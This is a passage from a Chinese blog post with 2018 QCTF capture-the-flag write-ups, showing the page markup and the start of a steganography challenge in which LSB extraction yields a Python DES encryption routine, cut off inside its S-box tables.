<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>2018 qctf writeup | AssassinQ</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
  <meta name="keywords" content="ctfwp" />
  
  
  
  
  <meta name="description" content="有好几题是看着大佬wp的复现。感觉自己实力还是欠缺很多。">
<meta name="keywords" content="ctf,wp">
<meta property="og:type" content="article">
<meta property="og:title" content="2018 QCTF writeup">
<meta property="og:url" content="http://AssassinQ.com/2018/07/21/2018-QCTF-writeup/index.html">
<meta property="og:site_name" content="AssassinQ">
<meta property="og:description" content="有好几题是看着大佬wp的复现。感觉自己实力还是欠缺很多。">
<meta property="og:locale" content="default">
<meta property="og:image" content="https://t1.aixinxi.net/o_1cj2cegpf1a1ee2s1pa318v1b5oa.png-j.jpg">
<meta property="og:image" content="https://t1.aixinxi.net/o_1cj2c9qcj15qp1ecb120mese10tra.png-j.jpg">
<meta property="og:image" content="https://t1.aixinxi.net/o_1cj2cbta3p4c119h195f18p11usa.png-j.jpg">
<meta property="og:image" content="https://t1.aixinxi.net/o_1cj2cdksn8ul9a6431i2vjgaa.png-j.jpg">
<meta property="og:image" content="https://t1.aixinxi.net/o_1cie3h9mih6q1s6mprc1s76as7a.png-j.jpg">
<meta property="og:image" content="https://t1.aixinxi.net/o_1cidmnk551p6urnj7h11pp9n0ma.png-j.jpg">
<meta property="og:image" content="https://t1.aixinxi.net/o_1cidmo79822q1v4b19buf0e1icaa.png-j.jpg">
<meta property="og:image" content="https://t1.aixinxi.net/o_1cidmjv341c1i17dgtal13dv1uh7a.png-j.jpg">
<meta property="og:image" content="https://t1.aixinxi.net/o_1cidmmb5p1sg0115g1vr96geamqa.png-j.jpg">
<meta property="og:image" content="https://t1.aixinxi.net/o_1cidmbqu5nks1jov1vrrlt01dhda.png-j.jpg">
<meta property="og:image" content="https://t1.aixinxi.net/o_1cidmd1l616vd1p8oj84ob2116na.png-j.jpg">
<meta property="og:image" content="https://t1.aixinxi.net/o_1cidmdldqh4l12633d4ovq16v9a.png-j.jpg">
<meta property="og:image" content="https://t1.aixinxi.net/o_1cidme4j61ipp1t5h1i261j6n6mua.png-j.jpg">
<meta property="og:image" content="https://t1.aixinxi.net/o_1cj0u8qv81vat7gpl071b5di3a.png-j.jpg">
<meta property="og:image" content="http://t1.aixinxi.net/o_1cidvqgvc1i7rg9n1jvm8af6ufa.png-j.jpg">
<meta property="og:image" content="https://t1.aixinxi.net/o_1cie3b4ho2g4khq1gbusv0106ua.png-j.jpg">
<meta property="og:image" content="https://t1.aixinxi.net/o_1cj0u5enu19d1d2cbam2qb1t3ia.png-j.jpg">
<meta property="og:image" content="https://t1.aixinxi.net/o_1cj0u737gceljoj9jn1fbb14opa.png-j.jpg">
<meta property="og:updated_time" content="2018-07-23T10:06:00.242Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="2018 QCTF writeup">
<meta name="twitter:description" content="有好几题是看着大佬wp的复现。感觉自己实力还是欠缺很多。">
<meta name="twitter:image" content="https://t1.aixinxi.net/o_1cj2cegpf1a1ee2s1pa318v1b5oa.png-j.jpg">
  
    <link rel="alternate" href="/atom.xml" title="AssassinQ" type="application/atom+xml">
  

  

  <link rel="icon" href="/css/images/mylogo.jpg">
  <link rel="apple-touch-icon" href="/css/images/mylogo.jpg">
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
  <style type="text/css">
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
  <link rel="stylesheet" href="/css/style.css">

  <script src="/js/jquery-3.1.1.min.js"></script>
  <script src="/js/bootstrap.js"></script>

  <!-- Bootstrap core CSS -->
  <link rel="stylesheet" href="/css/bootstrap.css" >

  
    <link rel="stylesheet" href="/css/dialog.css">
  

  

  
    <link rel="stylesheet" href="/css/header-post.css" >
  

  
  
  
    <link rel="stylesheet" href="/css/vdonate.css" >
  

</head>



  <body data-spy="scroll" data-target="#toc" data-offset="50">


  
  <div id="container">
    <div id="wrap">
      
        <header>

    <div id="allheader" class="navbar navbar-default navbar-static-top" role="navigation">
        <div class="navbar-inner">
          
          <div class="container"> 
            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
              <span class="sr-only">Toggle navigation</span>
              <span class="icon-bar"></span>
              <span class="icon-bar"></span>
              <span class="icon-bar"></span>
            </button>

            
              <a class="brand" style="
                 margin-top: 0px;"  
                href="#" data-toggle="modal" data-target="#myModal" >
                  <img width="124px" height="124px" alt="Hike News" src="/css/images/mylogo.jpg">
              </a>
            
            
            <div class="navbar-collapse collapse">
              <ul class="hnav navbar-nav">
                
                  <li> <a class="main-nav-link" href="/">Home</a> </li>
                
                  <li> <a class="main-nav-link" href="/archives">Archives</a> </li>
                
                  <li> <a class="main-nav-link" href="/tags">Tags</a> </li>
                
                  <li> <a class="main-nav-link" href="/links">links</a> </li>
                
                  <li> <a class="main-nav-link" href="/about">About</a> </li>
                
                  <li><div id="search-form-wrap">

    <form class="search-form">
        <input type="text" class="ins-search-input search-form-input" placeholder="" />
        <button type="submit" class="search-form-submit"></button>
    </form>
    <div class="ins-search">
    <div class="ins-search-mask"></div>
    <div class="ins-search-container">
        <div class="ins-input-wrapper">
            <input type="text" class="ins-search-input" placeholder="Type something..." />
            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
(function (window) {
    var INSIGHT_CONFIG = {
        TRANSLATION: {
            POSTS: 'Posts',
            PAGES: 'Pages',
            CATEGORIES: 'Categories',
            TAGS: 'Tags',
            UNTITLED: '(Untitled)',
        },
        ROOT_URL: '/',
        CONTENT_URL: '/content.json',
    };
    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
})(window);
</script>
<script src="/js/insight.js"></script>

</div></li>
            </div>
          </div>
                
      </div>
    </div>

</header>



      
            
      <div id="content" class="outer">
        
          <section id="main" style="float:none;"><article id="post-2018-QCTF-writeup" style="width: 75%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" class="article-title" itemprop="name">
      2018 QCTF writeup
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2018/07/21/2018-QCTF-writeup/" class="article-date">
	  <time datetime="2018-07-21T11:56:59.000Z" itemprop="datePublished">2018-07-21</time>
	</a>

      
      
	<a class="article-views">
	<span id="busuanzi_container_page_pv">
		PV:<span id="busuanzi_value_page_pv"></span>
	</span>
	</a>

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>有好几题是看着大佬wp的复现。感觉自己实力还是欠缺很多。</p>
<a id="more"></a>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="picture"><a href="#picture" class="headerlink" title="picture"></a>picture</h2><p>通过stegsolve判断出存在最低位隐写。使用lsb工具解出密文，为一段加密函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#_*_ coding:utf-8 _*_</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">ip=  (<span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>,</span><br><span class="line">      <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">      <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>,</span><br><span class="line">      <span class="number">64</span>, <span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>,</span><br><span class="line">      <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span> , <span class="number">1</span>,</span><br><span class="line">      <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>,</span><br><span class="line">      <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>,</span><br><span class="line">      <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">ip_1=(<span class="number">40</span>, <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span>, <span class="number">64</span>, <span class="number">32</span>,</span><br><span class="line">      <span class="number">39</span>, <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>,</span><br><span class="line">      <span class="number">38</span>, <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">62</span>, <span class="number">30</span>,</span><br><span class="line">      <span class="number">37</span>, <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>,</span><br><span class="line">      <span class="number">36</span>, <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="number">28</span>,</span><br><span class="line">      <span class="number">35</span>, <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>,</span><br><span class="line">      <span class="number">34</span>, <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">26</span>,</span><br><span class="line">      <span class="number">33</span>, <span class="number">1</span>, <span class="number">41</span>,  <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>)</span><br><span class="line"></span><br><span class="line">e  =(<span class="number">32</span>, <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">4</span>,  <span class="number">5</span>, </span><br><span class="line">       <span class="number">6</span>, <span class="number">7</span>,  <span class="number">8</span>,  <span class="number">9</span>,  <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, </span><br><span class="line">      <span class="number">12</span>,<span class="number">13</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>,</span><br><span class="line">      <span class="number">16</span>,<span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">20</span>, <span class="number">21</span>,</span><br><span class="line">      <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>,<span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>,</span><br><span class="line">      <span class="number">28</span>, <span class="number">29</span>,<span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>,  <span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line">p=(<span class="number">16</span>,  <span class="number">7</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">29</span>, <span class="number">12</span>, <span class="number">28</span>, <span class="number">17</span>,</span><br><span class="line">     <span class="number">1</span>, <span class="number">15</span>, <span class="number">23</span>, <span class="number">26</span>,  <span class="number">5</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">10</span>, </span><br><span class="line">     <span class="number">2</span>,  <span class="number">8</span>, <span class="number">24</span>, <span class="number">14</span>, <span class="number">32</span>, <span class="number">27</span>,  <span class="number">3</span>,  <span class="number">9</span>,</span><br><span class="line">     <span class="number">19</span>, <span class="number">13</span>, <span class="number">30</span>, <span class="number">6</span>, <span class="number">22</span>, <span class="number">11</span>,  <span class="number">4</span>,  <span class="number">25</span>)</span><br><span class="line"></span><br><span class="line">s=[ [[<span class="number">14</span>, <span class="number">4</span>, <span class="number">13</span>,  <span class="number">1</span>,  <span class="number">2</span>, <span class="number">15</span>, <span class="number">11</span>,  <span class="number">8</span>,  <span class="number">3</span>, <span class="number">10</span>,  <span class="number">6</span>, <span class="number">12</span>,  <span class="number">5</span>,  <span class="number">9</span>,  <span class="number">0</span>,  <span class="number">7</span>],</span><br><span class="line">     [<span class="number">0</span>, <span class="number">15</span>,  <span class="number">7</span>,  <span class="number">4</span>, <span class="number">14</span>,  <span class="number">2</span>, <span class="number">13</span>,  <span class="number">1</span>, <span class="number">10</span>,  <span class="number">6</span>, <span class="number">12</span>, <span class="number">11</span>,  <span class="number">9</span>,  <span class="number">5</span>,  <span class="number">3</span>,  <span class="number">8</span>],</span><br><span class="line">     [<span class="number">4</span>,  <span class="number">1</span>, <span class="number">14</span>,  <span class="number">8</span>, <span class="number">13</span>,  <span class="number">6</span>,  <span class="number">2</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">12</span>,  <span class="number">9</span>,  <span class="number">7</span>,  <span class="number">3</span>, <span class="number">10</span>,  <span class="number">5</span>,  <span class="number">0</span>],    </span><br><span class="line">     [<span class="number">15</span>, <span class="number">12</span>,  <span class="number">8</span>,  <span class="number">2</span>,  <span class="number">4</span>,  <span class="number">9</span>,  <span class="number">1</span>,  <span class="number">7</span>,  <span class="number">5</span>, <span class="number">11</span>,  <span class="number">3</span>, <span class="number">14</span>, <span class="number">10</span>,  <span class="number">0</span>,  <span class="number">6</span>, <span class="number">13</span>]],</span><br><span class="line"></span><br><span class="line">     [[<span class="number">15</span>,  <span class="number">1</span>,  <span class="number">8</span>, <span class="number">14</span>,  <span class="number">6</span>, <span class="number">11</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">9</span>,  <span class="number">7</span>,  <span class="number">2</span>, <span class="number">13</span>, <span class="number">12</span>,  <span class="number">0</span>,  <span class="number">5</span>, <span class="number">10</span>],     </span><br><span class="line">     [<span class="number">3</span>, <span class="number">13</span>,  <span class="number">4</span>,  <span class="number">7</span>, <span class="number">15</span>,  <span class="number">2</span>,  <span class="number">8</span>, <span class="number">14</span>, <span class="number">12</span>,  <span class="number">0</span>,  <span class="number">1</span>, <span class="number">10</span>,  <span class="number">6</span>,  <span class="number">9</span>, <span class="number">11</span>,  <span class="number">5</span>],     </span><br><span class="line">     [<span class="number">0</span>, <span class="number">14</span>,  <span class="number">7</span>, <span class="number">11</span>, <span class="number">10</span>,  <span class="number">4</span>, <span class="number">13</span>,  <span class="number">1</span>,  <span class="number">5</span>,  <span class="number">8</span>, <span class="number">12</span>,  <span class="number">6</span>,  <span class="number">9</span>,  <span class="number">3</span>,  <span class="number">2</span>, <span class="number">15</span>],     </span><br><span class="line">     [<span class="number">13</span>,  <span class="number">8</span>, <span class="number">10</span>,  <span class="number">1</span>,  <span class="number">3</span>, <span class="number">15</span>,  <span class="number">4</span>,  <span class="number">2</span>, <span class="number">11</span>,  <span class="number">6</span>,  <span class="number">7</span>, <span class="number">12</span>,  <span class="number">0</span>,  <span class="number">5</span>, <span class="number">14</span>,  <span class="number">9</span>]],</span><br><span class="line"></span><br><span class="line">     [[<span class="number">10</span>,  <span class="number">0</span>,  <span class="number">9</span>, <span class="number">14</span>,  <span class="number">6</span>,  <span class="number">3</span>, <span class="number">15</span>,  <span class="number">5</span>,  <span class="number">1</span>, <span class="number">13</span>, <span class="number">12</span>,  <span class="number">7</span>, <span class="number">11</span>,  <span class="number">4</span>,  <span class="number">2</span>,  <span class="number">8</span>],     </span><br><span class="line">     [<span class="number">13</span>,  <span class="number">7</span>,  <span class="number">0</span>,  <span class="number">9</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">6</span>, <span class="number">10</span>,  <span class="number">2</span>,  <span class="number">8</span>,  <span class="number">5</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">15</span>,  <span class="number">1</span>],   </span><br><span class="line">     [<span class="number">13</span>,  <span class="number">6</span>,  <span class="number">4</span>,  <span class="number">9</span>,  <span class="number">8</span>, <span class="number">15</span>,  <span class="number">3</span>,  <span class="number">0</span>, <span class="number">11</span>,  <span class="number">1</span>,  <span class="number">2</span>, <span class="number">12</span>,  <span class="number">5</span>, <span class="number">10</span>, <span class="number">14</span>,  <span class="number">7</span>],     </span><br><span class="line">     [<span class="number">1</span>, <span class="number">10</span>, <span class="number">13</span>,  <span class="number">0</span>,  <span class="number">6</span>,  <span class="number">9</span>,  <span class="number">8</span>,  <span class="number">7</span>,  <span class="number">4</span>, <span class="number">15</span>, <span class="number">14</span>,  <span class="number">3</span>, <span class="number">11</span>,  <span class="number">5</span>,  <span class="number">2</span>, <span class="number">12</span>]],</span><br><span class="line"></span><br><span class="line">    [[<span class="number">7</span>, <span class="number">13</span>, <span class="number">14</span>,  <span class="number">3</span>,  <span class="number">0</span>,  <span class="number">6</span>,  <span class="number">9</span>, <span class="number">10</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">8</span>,  <span class="number">5</span>, <span class="number">11</span>,  <span class="number">12</span>,  <span class="number">4</span>, <span class="number">15</span>],     </span><br><span class="line">     [<span class="number">13</span>,  <span class="number">8</span>, <span class="number">11</span>,  <span class="number">5</span>,  <span class="number">6</span>, <span class="number">15</span>,  <span class="number">0</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">7</span>,  <span class="number">2</span>, <span class="number">12</span>,  <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>,<span class="number">9</span>],     </span><br><span class="line">     [<span class="number">10</span>,  <span class="number">6</span>,  <span class="number">9</span>,  <span class="number">0</span>, <span class="number">12</span>, <span class="number">11</span>,  <span class="number">7</span>, <span class="number">13</span>, <span class="number">15</span>,  <span class="number">1</span>,  <span class="number">3</span>, <span class="number">14</span>,  <span class="number">5</span>,  <span class="number">2</span>,  <span class="number">8</span>,  <span class="number">4</span>],     </span><br><span class="line">     [<span class="number">3</span>, <span class="number">15</span>,  <span class="number">0</span>,  <span class="number">6</span>, <span class="number">10</span>,  <span class="number">1</span>, <span class="number">13</span>,  <span class="number">8</span>,  <span class="number">9</span>,  <span class="number">4</span>,  <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>,  <span class="number">7</span>,  <span class="number">2</span>, <span class="number">14</span>]],</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    [[<span class="number">2</span>, <span class="number">12</span>,  <span class="number">4</span>,  <span class="number">1</span>,  <span class="number">7</span>, <span class="number">10</span>, <span class="number">11</span>,  <span class="number">6</span>,  <span class="number">8</span>,  <span class="number">5</span>,  <span class="number">3</span>, <span class="number">15</span>, <span class="number">13</span>,  <span class="number">0</span>, <span class="number">14</span>,  <span class="number">9</span>],     </span><br><span class="line">     [<span class="number">14</span>, <span class="number">11</span>,  <span class="number">2</span>, <span class="number">12</span>,  <span class="number">4</span>,  <span class="number">7</span>, <span class="number">13</span>,  <span class="number">1</span>,  <span class="number">5</span>,  <span class="number">0</span>, <span class="number">15</span>, <span class="number">10</span>,  <span class="number">3</span>,  <span class="number">9</span>,  <span class="number">8</span>,  <span class="number">6</span>],     </span><br><span class="line">     [<span class="number">4</span>,  <span class="number">2</span>,  <span class="number">1</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">13</span>,  <span class="number">7</span>,  <span class="number">8</span>, <span class="number">15</span>,  <span class="number">9</span>, <span class="number">12</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">3</span>,  <span class="number">0</span>, <span class="number">14</span>],     </span><br><span class="line">     [<span class="number">11</span>,  <span class="number">8</span>, <span class="number">12</span>,  <span class="number">7</span>,  <span class="number">1</span>, <span class="number">14</span>,  <span class="number">2</span>, <span class="number">13</span>,  <span class="number">6</span>, <span class="number">15</span>,  <span class="number">0</span>,  <span class="number">9</span>, <span class="number">10</span>,  <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">3</span>]],</span><br><span class="line"></span><br><span class="line">    [[<span class="number">12</span>,  <span class="number">1</span>, <span class="number">10</span>, <span class="number">15</span>,  <span class="number">9</span>,  <span class="number">2</span>,  <span class="number">6</span>,  <span class="number">8</span>,  <span class="number">0</span>, <span class="number">13</span>,  <span class="number">3</span>,  <span class="number">4</span>, <span class="number">14</span>,  <span class="number">7</span>,  <span class="number">5</span>, <span class="number">11</span>],</span><br><span class="line">     [<span class="number">10</span>, <span class="number">15</span>,  <span class="number">4</span>,  <span class="number">2</span>,  <span class="number">7</span>, <span class="number">12</span>,  <span class="number">9</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">1</span>, <span class="number">13</span>, <span class="number">14</span>,  <span class="number">0</span>, <span class="number">11</span>,  <span class="number">3</span>,  <span class="number">8</span>],     </span><br><span class="line">     [<span class="number">9</span>, <span class="number">14</span>, <span class="number">15</span>,  <span class="number">5</span>,  <span class="number">2</span>,  <span class="number">8</span>, <span class="number">12</span>,  <span class="number">3</span>,  <span class="number">7</span>,  <span class="number">0</span>,  <span class="number">4</span>, <span class="number">10</span>,  <span class="number">1</span>, <span class="number">13</span>, <span class="number">11</span>,  <span class="number">6</span>],     </span><br><span class="line">     [<span class="number">4</span>,  <span class="number">3</span>,  <span class="number">2</span>, <span class="number">12</span>,  <span class="number">9</span>,  <span class="number">5</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">14</span>,  <span class="number">1</span>,  <span class="number">7</span>,  <span class="number">6</span>,  <span class="number">0</span>,  <span class="number">8</span>, <span class="number">13</span>]],</span><br><span class="line"></span><br><span class="line">    [[<span class="number">4</span>, <span class="number">11</span>,  <span class="number">2</span>, <span class="number">14</span>, <span class="number">15</span>,  <span class="number">0</span>,  <span class="number">8</span>, <span class="number">13</span>,  <span class="number">3</span>, <span class="number">12</span>,  <span 